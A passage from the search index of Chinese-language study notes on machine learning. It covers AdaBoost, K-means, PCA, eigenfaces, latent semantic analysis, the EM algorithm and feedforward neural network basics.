<li>\u5f31\u53ef\u5b66\u4e60\u6a21\u578b\uff1a\u5b66\u4e60\u6a21\u578b\u4ec5\u80fd\u5b8c\u6210\u82e5\u5e72\u90e8\u5206\u6837\u672c\u8bc6\u522b\u4e0e\u5206\u7c7b\uff0c\u7cbe\u5ea6\u7565\u9ad8\u4e8e\u968f\u673a\u731c\u6d4b</li> <li>\u5f3a\u53ef\u5b66\u4e60\u548c\u5f31\u53ef\u5b66\u4e60\u662f\u7b49\u4ef7\u7684\uff08\u53ef\u4ee5\u5229\u7528 ada boosting \u7b97\u6cd5\uff09</li> </ul> </li> </ul> </li> <li>Ada Boosting \u7b97\u6cd5<ul> <li>\u89e3\u51b3\u4e24\u4e2a\u6838\u5fc3\u95ee\u9898<ul> <li>\u5728\u6bcf\u4e2a\u5f31\u5206\u7c7b\u5668\u5b66\u4e60\u8fc7\u7a0b\u4e2d\uff0c\u5982\u4f55\u63d0\u9ad8\u5728\u4e0a\u4e00\u8f6e\u4e2d\u88ab\u9519\u8bef\u5206\u7c7b\u7684\u6837\u672c\u6743\u91cd\uff0c\u5373\u5173\u6ce8\u76ee\u524d\u5c1a\u672a\u88ab\u6b63\u786e\u5206\u7c7b\u7684\u6837\u672c</li> <li>\u5982\u4f55\u5c06\u4e00\u7cfb\u5217\u5f31\u5206\u7c7b\u5668\u7ec4\u5408\u6210\u5f3a\u5206\u7c7b\u5668\uff0c\u7ed9\u5206\u7c7b\u8bef\u5dee\u5c0f\u7684\u5f31\u5206\u7c7b\u5668\u8d4b\u4e88\u66f4\u5927\u6743\u91cd\uff0c\u540c\u65f6\u51cf\u5c11\u5206\u7c7b\u8bef\u5dee\u5927\u7684\u5f31\u5206\u7c7b\u5668\u7684\u6743\u91cd</li> </ul> </li> <li>\u901a\u8fc7\u96c6\u6210\u5b66\u4e60\u65b9\u6cd5\u5c06\u82e5\u5e72\u4e2a\u5f31\u5206\u7c7b\u5668\u7ec4\u5408\u6210\u5f3a\u5206\u7c7b\u5668</li> <li>Ada Boosting \u7b97\u6cd5\u7684\u57fa\u672c\u601d\u60f3\uff08from copilot\uff09<ul> <li>\u901a\u8fc7\u8fed\u4ee3\u7684\u65b9\u5f0f\uff0c\u6bcf\u4e00\u8f6e\u8fed\u4ee3\u90fd\u4f1a\u4ea7\u751f\u4e00\u4e2a\u5f31\u5206\u7c7b\u5668\uff0c\u6bcf\u4e2a\u5f31\u5206\u7c7b\u5668\u90fd\u4f1a\u5bf9\u6837\u672c\u8fdb\u884c\u5206\u7c7b</li> <li>\u5728\u6bcf\u4e00\u8f6e\u8fed\u4ee3\u4e2d\uff0c\u6839\u636e\u4e0a\u4e00\u8f6e\u8fed\u4ee3\u7684\u5206\u7c7b\u7ed3\u679c\uff0c\u5bf9\u6837\u672c\u8fdb\u884c\u52a0\u6743\uff0c\u4f7f\u5f97\u88ab\u9519\u8bef\u5206\u7c7b\u7684\u6837\u672c\u6743\u91cd\u589e\u5927\uff0c\u88ab\u6b63\u786e\u5206\u7c7b\u7684\u6837\u672c\u6743\u91cd\u51cf\u5c0f</li> <li>\u5728\u6bcf\u4e00\u8f6e\u8fed\u4ee3\u4e2d\uff0c\u6839\u636e\u4e0a\u4e00\u8f6e\u8fed\u4ee3\u7684\u5206\u7c7b\u7ed3\u679c\uff0c\u8ba1\u7b97\u5f31\u5206\u7c7b\u5668\u7684\u6743\u91cd</li> <li>\u5c06\u6240\u6709\u5f31\u5206\u7c7b\u5668\u7684\u5206\u7c7b\u7ed3\u679c\u8fdb\u884c\u52a0\u6743\u6c42\u548c\uff0c\u5f97\u5230\u6700\u7ec8\u7684\u5f3a\u5206\u7c7b\u5668</li> </ul> </li> <li>Ada Boosting \u91c7\u53d6\u4e86\u5e8f\u5217\u5316\u5b66\u4e60\u673a\u5236\uff0c\u5373\u4e00\u4e2a\u5206\u7c7b\u5668\u5b66\u4e60\u5b8c\u6210\u540e\u624d\u4f1a\u8fdb\u884c\u4e0b\u4e00\u4e2a\u5206\u7c7b\u5668\u7684\u5b66\u4e60\uff0c\u540e\u4e00\u4e2a\u5206\u7c7b\u5668\u7684\u5b66\u4e60\u53d7\u5230\u524d\u9762\u7684\u5f71\u54cd</li> <li>Ada Boosting \u5b9e\u9645\u662f\u5728\u6700\u5c0f\u5316\u6307\u6570\u635f\u5931\u51fd\u6570</li> <li>\u5728\u7b2c m \u6b21\u8fed\u4ee3\u4e2d\uff0cAda Boosting \u603b\u662f\u8d8b\u5411\u4e8e\u5c06\u5177\u6709\u6700\u5c0f\u8bef\u5dee\u7684\u5b66\u4e60\u6a21\u578b\u9009\u505a\u672c\u8f6e\u6b21\u751f\u6210\u7684\u5f31\u5206\u7c7b\u5668 Gm\uff0c\u4fc3\u4f7f\u7d2f\u79ef\u8bef\u5dee\u5feb\u901f\u4e0b\u964d</li> <li>Ada Boosting \u53ef\u5f52\u5c5e\u4e3a\u96c6\u6210\u5b66\u4e60\u8fd9\u4e00\u5206\u7c7b\u65b9\u6cd5<ul> <li>\u53e6\u4e00\u79cd\u5e38\u7528\u7684\u96c6\u6210\u5b66\u4e60\u65b9\u6cd5\u662f\u888b\u88c5\u6cd5\uff08bagging\uff09<ul> <li>\u4e0d\u6539\u53d8\u6837\u672c\u6570\u636e\u7684\u6743\u91cd\uff0c\u901a\u8fc7\u5e76\u884c\u548c\u968f\u673a\u91c7\u6837\u7684\u601d\u60f3\u6765\u5c06\u591a\u4e2a\u5f31\u5b66\u4e60\u6a21\u578b\u96c6\u6210\u4e3a\u5f3a\u5b66\u4e60\u6a21\u578b</li> </ul> </li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_16","title":"\u7edf\u8ba1\u673a\u5668\u5b66\u4e60\uff1a\u65e0\u76d1\u7763\u5b66\u4e60","text":""},{"location":"cs/ai/basic/#k","title":"K \u5747\u503c\u805a\u7c7b","text":"<ul> <li>K-means \u7b97\u6cd5\u8981\u6c42\u7279\u5f81\u53d8\u91cf\u8fde\u7eed\uff0c\u6570\u636e\u6ca1\u6709\u5f02\u5e38\u503c</li> <li>K-means \u7684\u76ee\u6807\u662f\u5c06 n \u4e2a d \u7ef4\u7684\u6570\u636e\u5212\u5206\u4e3a K \u4e2a\u805a\u7c07\uff0c\u4f7f\u5f97\u7c07\u5185\u7684\u65b9\u5dee\u6700\u5c0f\u5316\uff0c\u662f\u5c40\u90e8\u6700\u4f18\u4e0d\u4e00\u5b9a\u5168\u5c40\u6700\u4f18</li> <li>K-means \u662f\u4e00\u4e2a\u6613\u53d7\u521d\u59cb\u503c\u5f71\u54cd\u7684\u8fed\u4ee3\u7b97\u6cd5\uff0c\u5e38\u7528\u521d\u59cb\u5316\u65b9\u6cd5\u5305\u62ec forgy \u548c random partition</li> <li>\u7b97\u6cd5\u6b65\u9aa4<ul> <li>\u521d\u59cb\u5316\u805a\u7c7b\u8d28\u5fc3</li> <li>\u5bf9\u6570\u636e\u8fdb\u884c\u805a\u7c7b\uff1a\u5c06\u6bcf\u4e2a\u6570\u636e\u653e\u5165\u4e0e\u4e4b\u8ddd\u79bb\u6700\u8fd1\u7684\u805a\u7c7b\u8d28\u5fc3\u6240\u5728\u805a\u7c7b\u96c6\u5408\u4e2d</li> <li>\u66f4\u65b0\u805a\u7c7b\u8d28\u5fc3\uff1a\u6839\u636e\u805a\u7c7b\u7ed3\u679c\u66f4\u65b0\u805a\u7c7b\u8d28\u5fc3</li> <li>\u8fed\u4ee3\uff1a\u4e0a\u8ff0\u64cd\u4f5c\u8fdb\u884c\u8fed\u4ee3\uff0c\u76f4\u5230\u5230\u8fbe\u8fed\u4ee3\u6b21\u6570\u4e0a\u9650/\u4e24\u6b21\u8fed\u4ee3\u4e2d\u805a\u7c7b\u8d28\u5fc3\u4fdd\u6301\u4e0d\u53d8</li> </ul> </li> <li>\u901a\u5e38 K-means \u6536\u655b\u901f\u5ea6\u5f88\u5feb\uff0c\u5bf9\u4e8e\u805a\u7c07\u6570\u91cf \\(K\\) \u548c\u7ef4\u5ea6 \\(d\\)\uff0c\u80fd\u5728 \\(O(n^{dK+1})\\) \u590d\u6742\u5ea6\u5185\u6536\u655b</li> <li>K-means \u5047\u8bbe\u6570\u636e\u6ca1\u6709\u79bb\u7fa4\u70b9\uff0c\u5bf9\u79bb\u7fa4\u70b9\u7684\u5904\u7406\u548c\u5176\u5b83\u6570\u636e\u4e00\u6837<ul> <li>\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u76ee\u6807\u51fd\u6570\u6216 K-medoids \u7b97\u6cd5\u6765\u51cf\u5c0f\u79bb\u7fa4\u70b9\u7684\u5f71\u54cd\uff08K-medoids \u9009\u62e9\u805a\u7c07\u4e2d\u7684\u4e00\u4e2a\u70b9\u800c\u4e0d\u662f\u5747\u503c\u4f5c\u4e3a\u805a\u7c7b\u4e2d\u5fc3\uff09</li> </ul> </li> <li>K-means \u9700\u8981\u4e8b\u5148\u786e\u5b9a\u805a\u7c7b\u6570\u76ee K\uff0c\u4e00\u822c\u5728\u4e00\u4e2a\u8303\u56f4\u5185\u904d\u5386\uff0c\u9009\u62e9\u6700\u4f18\u7684\u4e00\u4e2a</li> <li>K-means \u805a\u7c7b\u7b97\u6cd5\u5bf9\u6570\u636e\u7684\u5c3a\u5ea6\u654f\u611f</li> <li>K-means \u5c5e\u4e8e\u786c\u805a\u7c7b\uff08hard clustering\uff09\uff0c\u5373\u6bcf\u4e2a\u6570\u636e\u53ea\u80fd\u5c5e\u4e8e\u4e00\u4e2a\u805a\u7c07<ul> <li>\u5c42\u6b21\u805a\u7c7b\uff08hierarchical clustering\uff09\u4e0d\u9700\u8981\u4e8b\u5148\u51b3\u5b9a\u805a\u7c7b\u6570\u76ee K</li> <li>\u57fa\u4e8e\u964d\u7ef4\u7684\u805a\u7c7b\u7b97\u6cd5\u8c31\u805a\u7c7b\uff08spectral clustering\uff09\u5bf9\u6570\u636e\u6240\u5728\u5750\u6807\u7a7a\u95f4\u4e0d\u654f\u611f</li> </ul> </li> <li>K-means \u53ef\u4ee5\u7528\u4e8e\u56fe\u50cf\u538b\u7f29\uff0c\u5373\u5c06\u6240\u6709\u8272\u5f69\u66ff\u6362\u4e3a\u805a\u7c7b\u540e\u7684 K \u79cd\u8272\u5f69</li> </ul>"},{"location":"cs/ai/basic/#_17","title":"\u4e3b\u6210\u5206\u5206\u6790","text":"<ul> <li>PCA \u662f\u4e00\u79cd\u7279\u5f81\u964d\u7ef4\u7684\u65b9\u6cd5\uff0c\u4e5f\u79f0 KL \u53d8\u6362\u3001\u970d\u6797\u7279\u53d8\u6362\u3001\u672c\u5f81\u6b63\u4ea4\u5206\u89e3</li> <li>\u4e3b\u6210\u5206\u5206\u6790\u901a\u8fc7\u5206\u6790\u627e\u5230\u6570\u636e\u7279\u5f81\u7684\u4e3b\u8981\u6210\u5206\uff0c\u4f7f\u7528\u8fd9\u4e9b\u4e3b\u8981\u6210\u5206\u6765\u4ee3\u66ff\u539f\u59cb\u6570\u636e</li> <li>PCA \u8981\u6c42\u964d\u7ef4\u540e\u7684\u7ed3\u679c\u8981\u4fdd\u6301\u539f\u59cb\u6570\u636e\u7684\u539f\u6709\u7ed3\u6784\uff0c\u8981\u6c42\u6700\u5927\u7a0b\u5ea6\u4fdd\u6301\u539f\u59cb\u9ad8\u7ef4\u6570\u636e\u7684\u603b\u4f53\u65b9\u5dee\u7ed3\u6784</li> <li>\u964d\u7ef4\u9700\u8981\u5c3d\u53ef\u80fd\u5c06\u6570\u636e\u5411\u65b9\u5dee\u6700\u5927\u7684\u65b9\u5411\u8fdb\u884c\u6295\u5f71\uff0c\u4f7f\u5f97\u6570\u636e\u6240\u8574\u542b\u7684\u4fe1\u606f\u4e22\u5931\u5f97\u5c3d\u53ef\u80fd\u5c11</li> <li>PCA \u601d\u60f3\u662f\u5c06 d \u7ef4\u7279\u5f81\u6570\u636e\u6620\u5c04\u5230 l \u7ef4\u7a7a\u95f4\uff08d&gt;&gt;l\uff09\uff0c\u53bb\u9664\u539f\u59cb\u6570\u636e\u4e4b\u95f4\u7684\u5197\u4f59\u6027\uff08\u53bb\u9664\u76f8\u5173\u6027\uff09\uff0c\u5c06\u539f\u59cb\u6570\u636e\u5411\u8fd9\u4e9b\u6570\u636e\u65b9\u5dee\u6700\u5927\u7684\u65b9\u5411\u8fdb\u884c\u6295\u5f71\uff0c\u7136\u540e\u7ee7\u7eed\u5bfb\u627e\u4fdd\u6301\u65b9\u5dee\u7b2c\u4e8c\u7684\u65b9\u5411\u8fdb\u884c\u6295\u5f71\uff0c\u4f7f\u6570\u636e\u6bcf\u4e00\u7ef4\u7684\u65b9\u5dee\u90fd\u5c3d\u53ef\u80fd\u5927</li> <li>\u7b97\u6cd5\u6b65\u9aa4<ul> <li>\u5bf9\u4e8e\u6bcf\u4e2a\u6837\u672c\u6570\u636e \\(x_i\\) \u8fdb\u884c\u4e2d\u5fc3\u5316\u5904\u7406\uff1a\\(x_i:=x_i-\\mu, \\mu=\\dfrac{1}{n}\\sum_{j=1}^nx_j\\)</li> <li>\u8ba1\u7b97\u539f\u59cb\u6837\u672c\u6570\u636e\u7684\u534f\u65b9\u5dee\u77e9\u9635\uff1a\\(\\mathbf{\\Sigma} = \\dfrac{1}{n-1}\\mathbf{X}^\\top\\mathbf{X}\\)</li> <li>\u5bf9\u534f\u65b9\u5dee\u77e9\u9635 \\(\\mathbf{\\Sigma}\\) \u8fdb\u884c\u7279\u5f81\u503c\u5206\u89e3\uff0c\u5bf9\u6240\u5f97\u7279\u5f81\u6839\u8fdb\u884c\u6392\u5e8f \\(\\lambda_1\\geq\\lambda_2\\geq\\cdots\\geq\\lambda_l\\)</li> <li>\u53d6\u524d \\(l\\) \u4e2a\u7279\u5f81\u6839\u6240\u5bf9\u5e94\u7279\u5f81\u5411\u91cf \\(\\mathbf{w}_1, \\mathbf{w}_2, \\cdots, \\mathbf{w}_l\\) \u7ec4\u6210\u6620\u5c04\u77e9\u9635</li> </ul> </li> <li>\u5176\u4ed6\u5e38\u7528\u964d\u7ef4\u65b9\u6cd5<ul> <li>\u975e\u8d1f\u77e9\u9635\u5206\u89e3\uff08NMF\uff09\uff0c\u5c06\u975e\u8d1f\u7684\u5927\u77e9\u9635\u5206\u89e3\u4e3a\u4e24\u4e2a\u975e\u8d1f\u7684\u5c0f\u77e9\u9635\uff0c</li> <li>\u591a\u7ef4\u5c3a\u5ea6\u6cd5\uff08MDS\uff09\u4fdd\u6301\u539f\u59cb\u6570\u636e\u4e4b\u95f4\u4e24\u4e24\u8ddd\u79bb\u4e0d\u53d8\uff0c\u4f46\u65e0\u6cd5\u5bf9\u65b0\u6570\u636e\u96c6\u5408\u8fdb\u884c\u964d\u7ef4\uff08out-of-sample\uff09</li> <li>\u5c40\u90e8\u7ebf\u6027\u5d4c\u5165\uff08LLE\uff09\u662f\u4e00\u79cd\u975e\u7ebf\u6027\u964d\u7ef4\u65b9\u6cd5\uff0c\u4e00\u4e2a\u6d41\u5f62\u7684\u5c40\u90e8\u53ef\u4ee5\u8fd1\u4f3c\u4e8e\u4e00\u4e2a\u975e\u6b27\u6c0f\u7a7a\u95f4\uff0c\u6bcf\u4e2a\u6837\u672c\u5747\u53ef\u4ee5\u5229\u7528\u5176\u90bb\u5c45\u8fdb\u884c\u7ebf\u6027\u91cd\u6784</li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_18","title":"\u7279\u5f81\u4eba\u8138\u65b9\u6cd5","text":"<ul> <li>\u7279\u5f81\u4eba\u8138\u65b9\u6cd5\u662f\u57fa\u4e8e\u5916\u89c2\u7684\u4eba\u8138\u8bc6\u522b\u65b9\u6cd5\uff0c\u76ee\u7684\u662f\u6355\u6349\u4eba\u8138\u56fe\u50cf\u96c6\u5408\u4e2d\u7279\u5f81\u4fe1\u606f\uff0c\u4f7f\u7528\u8be5\u4fe1\u606f\u5bf9\u5404\u4e2a\u4eba\u8138\u56fe\u50cf\u8fdb\u884c\u7f16\u7801\u548c\u6bd4\u8f83</li> <li>\u4f7f\u7528 PCA \u624b\u6bb5\u6765\u8868\u793a\u7279\u5f81\u4eba\u8138\uff0c\u672c\u8d28\u662f\u4f7f\u7528\u4e00\u7ec4\u7279\u5f81\u5411\u91cf\u7ebf\u6027\u7ec4\u5408\u6765\u8868\u793a\u539f\u59cb\u4eba\u8138\uff0c\u8fdb\u800c\u5b9e\u73b0\u4eba\u8138\u8bc6\u522b</li> <li>\u5728\u7279\u5f81\u7ef4\u5ea6\u8f83\u9ad8\u7684\u60c5\u51b5\u4e0b\uff0c\u4e3b\u6210\u5206\u5206\u6790\u7b97\u6cd5\u66b4\u529b\u6c42\u89e3\u7279\u5f81\u5411\u91cf\u662f\u4e00\u4e2a\u8017\u65f6\u64cd\u4f5c\uff0c\u53ef\u4ee5\u4f7f\u7528\u5947\u5f02\u503c\u5206\u89e3\uff08SVD\uff09\u6765\u5b9e\u73b0\u4e3b\u6210\u5206\u5206\u6790</li> </ul>"},{"location":"cs/ai/basic/#_19","title":"\u6f5c\u5728\u8bed\u4e49\u5206\u6790","text":"<ul> <li>\u6f5c\u5728\u8bed\u4e49\u5206\u6790\uff0c\u53c8\u79f0\u4e3a\u9690\u5f62\u8bed\u4e49\u5206\u6790\uff08LSA/LSI\uff09\u662f\u4e00\u79cd\u4ece\u6d77\u91cf\u6587\u672c\u6570\u636e\u4e2d\u5b66\u4e60\u5355\u8bcd-\u5355\u8bcd\u3001\u5355\u8bcd-\u6587\u6863\u4ee5\u53ca\u6587\u6863-\u6587\u6863\u4e4b\u95f4\u7684\u9690\u5f62\u5173\u7cfb\uff0c\u4ece\u800c\u5f97\u5230\u6587\u6863\u548c\u5355\u8bcd\u8868\u8fbe\u7279\u5f81\u7684\u65b9\u6cd5</li> <li>\u8be5\u65b9\u6cd5\u7684\u57fa\u672c\u601d\u60f3\u662f\u7efc\u5408\u8003\u8651\u67d0\u4e9b\u5355\u8bcd\u5728\u54ea\u4e9b\u6587\u6863\u4e2d\u540c\u65f6\u51fa\u73b0\u4ee5\u6b64\u6765\u51b3\u5b9a\u8be5\u8bcd\u8bed\u7684\u542b\u4e49\u4e0e\u5176\u4ed6\u7684\u8bcd\u8bed\u7684\u76f8\u4f3c\u5ea6</li> <li>LSI \u88ab\u5e7f\u6cdb\u8fd0\u7528\u5728\u4e86\u8bed\u4e49\u7406\u89e3\u4efb\u52a1\u4e2d\uff0c\u5982\u81ea\u52a8\u6587\u6863\u5206\u7c7b\u3001\u6587\u672c\u6458\u8981\u548c\u5173\u7cfb\u53d1\u73b0</li> <li>\u6f5c\u5728\u8bed\u4e49\u5206\u6790\u601d\u60f3<ul> <li>\u5148\u6784\u5efa\u4e00\u4e2a\u5355\u8bcd-\u6587\u6863\u77e9\u9635 A</li> <li>\u8fdb\u800c\u5bfb\u627e\u8be5\u77e9\u9635\u7684\u4f4e\u79e9\u903c\u8fd1\uff0c\u6765\u6316\u6398\u5355\u8bcd-\u5355\u8bcd\u3001\u5355\u8bcd-\u6587\u6863\u4ee5\u53ca\u6587\u6863-\u6587\u6863\u4e4b\u95f4\u7684\u5173\u8054\u5173\u7cfb</li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_20","title":"\u671f\u671b\u6700\u5927\u5316\u7b97\u6cd5","text":"<ul> <li>\u5047\u8bbe\u7531 n \u4e2a\u6570\u636e\u6837\u672c\u6784\u6210\u7684\u96c6\u5408 \\(\\mathcal{D}=\\{x_1, x_2, \\cdots, x_n\\}\\) \u4ee5\u53c2\u6570\u4e3a \\(\\Theta\\) \u7684\u67d0\u4e2a\u6a21\u578b\u4ee5\u4e00\u5b9a\u6982\u7387\u72ec\u7acb\u91c7\u6837\u5f97\u5230\uff0c\u4e8e\u662f\u53ef\u4ee5\u901a\u8fc7\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\u6cd5\uff08MLE\uff09\u6765\u6c42\u53d6\u53c2\u6570 \\(\\Theta\\)\uff0c\u4f7f\u5f97\u5728\u53c2\u6570\u4e3a \\(\\Theta\\) \u7684\u6a21\u578b\u4e0b\uff0c\u6837\u672c\u96c6 \\(\\mathcal{D}\\) \u51fa\u73b0\u7684\u6982\u7387\u6700\u5927<ul> <li>\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6700\u5927\u540e\u9a8c\u4f30\u8ba1\uff08MAP\uff09\u6765\u4f30\u8ba1\u53c2\u6570 \\(\\Theta\\)</li> <li>\u90fd\u662f\u5145\u5206\u5229\u7528\u5df2\u6709\u6570\u636e\uff0c\u5728\u53c2\u6570\u6a21\u578b\u786e\u5b9a\uff08\u53ea\u662f\u53c2\u6570\u503c\u672a\u77e5\uff09\u7684\u60c5\u51b5\u4e0b\uff0c\u5bf9\u6240\u4f18\u5316\u76ee\u6807\u4e2d\u7684\u53c2\u6570\u6c42\u5bfc\uff0c\u4ee4\u5bfc\u6570\u4e3a 0\uff0c\u6c42\u53d6\u6a21\u578b\u7684\u53c2\u6570\u503c</li> </ul> </li> <li>\u4e00\u4e9b\u60c5\u51b5\u4e0b\u96be\u4ee5\u4e8b\u5148\u786e\u5b9a\u6a21\u578b\uff0c\u65e0\u6cd5\u7528 MLE \u6216 MAP</li> <li>\u671f\u671b\u6700\u5927\u5316\uff08expectation maximization\uff0cEM\uff09\u7b97\u6cd5\u662f\u4e00\u79cd\u7528\u4e8e\u89e3\u51b3\u542b\u6709\u9690\u53d8\u91cf\u95ee\u9898\u7684\u53c2\u6570\u4f30\u8ba1\u65b9\u6cd5<ul> <li>\u6c42\u53d6\u671f\u671b\uff08E \u6b65\u9aa4\uff09\uff1a\u5148\u5047\u8bbe\u6a21\u578b\u53c2\u6570\u7684\u521d\u59cb\u503c\uff0c\u4f30\u8ba1\u9690\u53d8\u91cf\u53d6\u503c</li> <li>\u671f\u671b\u6700\u5927\u5316\uff08M \u6b65\u9aa4\uff09\uff1a\u57fa\u4e8e\u89c2\u6d4b\u6570\u636e\u3001\u6a21\u578b\u53c2\u6570\u548c\u9690\u53d8\u91cf\u53d6\u503c\u4e00\u8d77\u6765\u6700\u5927\u5316\u62df\u5408\u6570\u636e\uff0c\u66f4\u65b0\u53c2\u6570\u6a21\u578b\uff0c\u76f4\u5230\u7b97\u6cd5\u6536\u655b</li> </ul> </li> <li>EM \u7b97\u6cd5\u4e0d\u80fd\u4fdd\u8bc1\u627e\u5230\u5168\u5c40\u7684\u6700\u5927\u503c\uff0c\u6709\u53ef\u80fd\u627e\u5230\u4e00\u4e2a\u978d\u70b9</li> <li>EM \u7b97\u6cd5\u6b65\u9aa4<ul> <li>\u521d\u59cb\u5316\u53c2\u6570\u53d6\u503c \\(\\Theta^0\\)</li> <li>\u6c42\u53d6\u671f\u671b\u6b65\u9aa4\uff1a\u8ba1\u7b97 \\(Q(\\Theta|\\Theta^t)=\\sum_{i=1}^n\\sum_{z_i}P(z_i|x_i,\\Theta)\\log P(x_i, z_i|\\Theta)\\)<ul> <li>\u542b\u4e49\u662f\u5bf9\u6570\u4f3c\u7136\u51fd\u6570 \\(\\log P(x_i, z_i|\\Theta)\\) \u5728\u5df2\u89c2\u6d4b\u6570\u636e \\(X\\) \u548c\u5f53\u524d\u53c2\u6570 \\(\\Theta^t\\) \u4e0b\u53bb\u4f30\u8ba1\u9690\u53d8\u91cf \\(Z\\) \u7684\u6761\u4ef6\u6982\u7387\u5206\u5e03</li> </ul> </li> <li>\u671f\u671b\u6700\u5927\u5316\u6b65\u9aa4\uff1a\\(\\Theta^{t+1}=\\argmax_\\Theta Q(\\Theta|\\Theta^t)\\)</li> <li>\u91cd\u590d\u4e8c\u4e09\u6b65\uff0c\u76f4\u5230\u6536\u655b</li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_21","title":"\u6df1\u5ea6\u5b66\u4e60","text":""},{"location":"cs/ai/basic/#_22","title":"\u524d\u9988\u795e\u7ecf\u7f51\u7edc","text":"<ul> <li>\u524d\u9988\u795e\u7ecf\u7f51\u7edc\uff08feedforward neural network\uff0cFNN\uff09\u662f\u4e00\u79cd\u6700\u7b80\u5355\u7684\u795e\u7ecf\u7f51\u7edc\uff0c\u7531\u8f93\u5165\u5c42\u3001\u9690\u85cf\u5c42\u548c\u8f93\u51fa\u5c42\u7ec4\u6210<ul> <li>\u6bcf\u5c42\u795e\u7ecf\u5143\u53ea\u548c\u76f8\u90bb\u5c42\u795e\u7ecf\u5143\u76f8\u8fde\uff0c\u5373\u6bcf\u5c42\u795e\u7ecf\u5143\u53ea\u63a5\u53d7\u76f8\u90bb\u524d\u5e8f\u795e\u7ecf\u5c42\u4e2d\u795e\u7ecf\u5143\u4f20\u6765\u7684\u4fe1\u606f\uff0c\u53ea\u7ed9\u76f8\u90bb\u540e\u7eed\u795e\u7ecf\u5c42\u4e2d\u795e\u7ecf\u5143\u4f20\u9012\u4fe1\u606f</li> <li>\u540c\u4e00\u5c42\u7684\u795e\u7ecf\u5143\u4e4b\u95f4\u6ca1\u6709\u4efb\u4f55\u8fde\u63a5\uff0c\u540e\u7eed\u795e\u7ecf\u5c42\u4e5f\u4e0d\u5411\u524d\u5e8f\u76f8\u90bb\u795e\u7ecf\u5c42\u4f20\u9012\u4fe1\u606f</li> <li>\u662f\u76ee\u524d\u6700\u4e3a\u5e7f\u6cdb\u7684\u795e\u7ecf\u7f51\u7edc\u4e4b\u4e00</li> </ul> </li> <li>\u795e\u7ecf\u5143<ul> <li>\u7ed9\u5b9a \\(n\\) \u4e2a\u4e8c\u503c\u5316\u8f93\u5165\u6570\u636e \\(x_i\\) \u4e0e\u8fde\u63a5\u53c2\u6570 \\(w_i\\)\uff0cMCP \u795e\u7ecf\u5143\u5bf9\u8f93\u5165\u6570\u636e\u7ebf\u6027\u52a0\u6743\u6c42\u548c\u7136\u540e\u5c06\u7ed3\u679c\u6839\u636e\u9608\u503c \\(\\theta\\) \u8fdb\u884c\u4e8c\u503c\u5316\uff0c\u5f97\u5230\u8f93\u51fa \\(y=\\Phi\\left(\\sum_{i=1}^nw_ix_i\\right)\\)</li> <li>\u4e8c\u503c\u53ef\u80fd\u662f 0 \u548c 1 \u4e5f\u53ef\u80fd\u662f -1 \u548c 1</li> </ul> </li> <li>\u6fc0\u6d3b\u51fd\u6570<ul> <li>\u795e\u7ecf\u7f51\u7edc\u4f7f\u7528\u975e\u7ebf\u6027\u51fd\u6570\u4f5c\u4e3a\u6fc0\u6d3b\u51fd\u6570\uff0c\u901a\u8fc7\u5bf9\u591a\u4e2a\u975e\u7ebf\u6027\u51fd\u6570\u8fdb\u884c\u7ec4\u5408\uff0c\u6765\u5b9e\u73b0\u5bf9\u8f93\u5165\u4fe1\u606f\u7684\u975e\u7ebf\u6027\u53d8\u6362</li> <li>\u6fc0\u6d3b\u51fd\u6570\u5fc5\u987b\u662f\u8fde\u7eed\u53ef\u5bfc\u7684</li> <li>\u5e38\u7528\u6fc0\u6d3b\u51fd\u6570<ul> <li>sigmoid\uff0c\\(f(x)=\\dfrac{1}{1+e^{-x}}\\)\uff0c\u5bfc\u6570 \\(f'(x)=f(x)(1-f(x))\\)</li> <li>tanh\uff0c\\(f(x)=\\dfrac{1-e^{-2x}}{1+e^{-2x}}\\)\uff0c\u5bfc\u6570 \\(f'(x)=1-f^2(x)\\)</li> <li>ReLU\uff0c\\(f(x)=\\max(0, x)\\)\uff0c\u5bfc\u6570 0/1<ul> <li>\u6709\u6548\u514b\u670d\u68af\u5ea6\u6d88\u5931\u95ee\u9898</li> </ul> </li> <li>softmax\uff0c\u4e00\u822c\u7528\u5728\u591a\u5206\u7c7b\u95ee\u9898\u4e2d\uff0c\\(f(x_i)=\\dfrac{e^{x_i}}{\\sum_{j=1}^ke^{x_j}}\\)<ul> <li>\u53ef\u5c06\u8f93\u51fa\u6982\u7387\u6700\u5927\u7684\u4f5c\u4e3a\u5206\u7c7b\u76ee\u6807</li> </ul> </li> </ul> </li> </ul> </li> <li>\u635f\u5931\u51fd\u6570\uff08loss function\uff09/\u4ee3\u4ef7\u51fd\u6570\uff08cost function\uff09<ul> <li>\u7528\u6765\u8ba1\u7b97\u6a21\u578b\u9884\u6d4b\u503c\u4e0e\u771f\u5b9e\u503c\u4e4b\u95f4\u7684\u8bef\u5dee</li> <li>\u5747\u65b9\u8bef\u5dee\u635f\u5931\u51fd\u6570 \\(\\mathrm{MSE}=\\dfrac{1}{n}\\sum_{i=1}^n(y_i-\\hat{y}_i)^2\\)</li> <li>\u4ea4\u53c9\u71b5\u635f\u5931\u51fd\u6570\uff0c\u5ea6\u91cf\u4e24\u4e2a\u6982\u7387\u5206\u5e03\u4e4b\u95f4\u7684\u5dee\u5f02 \\(H(p, q)=-\\sum_xp(x)\\log q(x)\\)<ul> <li>\u65e8\u5728\u63cf\u7ed8\u901a\u8fc7\u6982\u7387\u5206\u5e03 \\(q\\) \u6765\u8868\u8fbe\u6982\u7387\u5206\u5e03 \\(p\\) \u7684\u56f0\u96be\u7a0b\u5ea6</li> <li>\u4ea4\u53c9\u71b5\u8d8a\u5c0f\uff0c\u4e24\u4e2a\u6982\u7387\u5206\u5e03\u8d8a\u63a5\u8fd1</li> </ul> </li> </ul> </li> <li>\u611f\u77e5\u673a\u6a21\u578b<ul> <li>\u5355\u5c42\u611f\u77e5\u673a<ul> <li>\u7531\u4e00\u4e2a\u8f93\u5165\u5c42\u548c\u4e00\u4e2a\u8f93\u51fa\u5c42\u6784\u6210\uff0c\u8f93\u51fa\u5c42\u8f93\u51fa -1 \u6216 1</li> <li>\u53ef\u4f5c\u4e3a\u4e00\u79cd\u4e8c\u7c7b\u7ebf\u6027\u5206\u7c7b\u6a21\u578b</li> 